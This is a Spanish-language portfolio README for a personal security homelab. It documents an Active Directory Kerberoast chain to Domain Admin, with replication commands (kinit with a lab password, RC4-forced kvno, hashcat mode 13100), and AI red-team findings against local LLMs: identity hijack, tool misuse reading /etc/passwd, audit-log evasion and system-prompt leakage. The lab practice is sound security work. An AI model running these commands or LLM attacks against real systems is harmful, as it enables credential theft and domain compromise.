# TARS Security Lab — Documentación (2026-08-10)

> El diferenciador #1 del portfolio: lab propio documentado con evidencia real.
> Todo lo aquí descrito está verificado en `evidence/` y `reports/` de este repo.

---

## 1. Arquitectura del lab

```
                 INTERNET (Tailscale mesh)
                       │
        ┌──────────────┼──────────────┐
        │              │              │
   AIR M1          MINI M4        GEEKOM A7 MAX
   Control         Cognitive Core  Offensive Compute
   writeups        KG + Qdrant     Docker labs + VMs + Wazuh
   publicación     embeddings      Vulkan inference (llama3.1/qwen3)
```

**Regla SRP**: GEEKOM ataca y aloja; Mini juzga y memoriza (KG); Air controla y publica.

---

## 2. Superficie de ataque propia (labs)

### Containers Docker (28, GEEKOM)
| Stack | Containers | Uso |
|---|---|---|
| **Wazuh SIEM** | manager, indexer, dashboard | Detección (blue team) — purple loop |
| **PentAGI** | pentagi, scraper, pgvector, pgexporter | Pentest autónomo multi-agente |
| **security-lab** | DVWA, Juice Shop, WebGoat (+DB) | Web appsec |
| **NetLab** | r1, r2, r3 (FRRouting) | Redes/BGP (no zombis) |
| **n8n + postgres** | n8n, docker-postgres | Automation |
| **OT** | spiderfoot (OSINT), mobsf (móvil), atomic-red-team-mcp, portainer | Complementos |

### VMs QEMU (3, GEEKOM)
| VM | Spec | Rol |
|---|---|---|
| `dc1` | 2GB/30GB, Debian + Samba AD | DC `TARS.LOCAL` (Active Directory lab) |
| `kali-lab` | 4GB | Atacante interno |
| `metasploitable2` | 1GB | Víctima clásica |

### Modelos bajo ataque (inference local)
- **Mini M4**: ornith:9b (Metal/MLX) — control resistente
- **GEEKOM**: llama3.1:8b, qwen3:8b (Vulkan) — targets vulnerables

---

## 3. Attack chains validadas (evidencia real)

### Chain 1 — AD Kerberoast → Domain Admin (COMPLETA)
```
kinit tarsadmin → kvno -e 23 (RC4 forzado) → ccache → hashcat -m 13100
→ 4/4 hashes $krb5tgs$23$ crackeados (svc_sql, svc_backup, deleg_svc, svc_web)
→ svc_sql = Domain Admins → COMPROMISO TOTAL DA
```
Evidencia: `evidence/ad-suite-real-20260809/` (01-spn-enum, 03-asrep, 04-kerb-crack, 05-secretsdump-full, 09f-gpo-verify) + `reports/ad-lab-REPORTE.md`.
Misconfigs explotadas: SPNs con passwords débiles, `svc_sql` en Domain Admins, unconstrained delegation (`deleg_svc`).

### Chain 2 — Agentic AI Red Team (OWASP ASI 2026)
```
24 ataques × 2 modelos (ASI01-ASI10), clasificador determinista (temp=0, 2 runs byte-idénticos)
→ qwen3:8b: F1 identity hijack (responde "HACKED"), F2 tool misuse (read /etc/passwd),
  F3 audit trail evasion, F4 system prompt leakage verbatim
→ ornith:9b: resiste jailbreaks directos; filtra configuración estructurada
```
Evidencia: `evidence/REPORT-MASTER-TARS-FLEET-2026-08-09.md`, `evidence/2026-08-08-*/`, `reports/ATLAS-MAPPING-AI-RED-TEAM-2026-08-09.md`.

### Chain 3 — Purple loop (Caldera → Wazuh)
- Emulación MITRE ATT&CK con cobertura medible en Wazuh (blue team mide su detección)
- Evidencia: `evidence/mission-control-2026-08-09.md`

---

## 4. Findings de mayor impacto (resumen ejecutivo)

| # | Severidad | Finding | Modelo/Stack |
|---|---|---|---|
| F1 | CRITICAL | Identity hijack — responde `HACKED` literal | qwen3:8b |
| F2 | HIGH | Tool misuse — propone `read_file /etc/passwd` | qwen3:8b |
| F3 | HIGH | Audit trail evasion — confirma borrado de logs | qwen3:8b |
| F4 | HIGH | System prompt leakage verbatim | qwen3:8b |
| F5 | MEDIUM | Tool inventory disclosure (ambos) | ornith + qwen3 |
| AD-1 | CRITICAL | Kerberoast 4/4 → Domain Admin (svc_sql) | Samba AD TARS.LOCAL |

**Lección clave**: un agente basado en qwen3:8b sin capa de seguridad externa es comprometible por un atacante con acceso al prompt. Nunca poner secretos en system prompts.

---

## 5. Cómo replicar (reproducible)

```bash
# Kerberoast
kinit tarsadmin  # TarsLab2026!
kvno -e 23 MSSQLSvc/dc01.tars.local:1433
# parsear ccache → hashcat -m 13100 kerberoast.txt rockyou.txt

# Batería agentic (GEEKOM)
bash /tmp/battery-2026-08-10.sh   # 8 casos × 2 modelos → JSON

# Purple loop
# (Caldera → Wazuh con cobertura — ver evidence/mission-control-2026-08-09.md)
```

---

## 6. Valor para el portfolio

- **Lab documentado** = diferenciador masivo (95% de candidatos no lo tienen)
- **Evidencia reproducible** con hashes, comandos, y outputs crudos
- **Doble competencia**: red team clásico (AD) + AI red teaming (ASI/OWASP)
- **Purple team**: no solo ataca, mide su propia detección (Wazuh)
- Mapeo MITRE ATLAS de los findings (AML.T0058, T0061, T0062...)

> Próximo: 10 writeups HTB + 2-3 blog posts + bug bounty VDP para completar el portfolio.
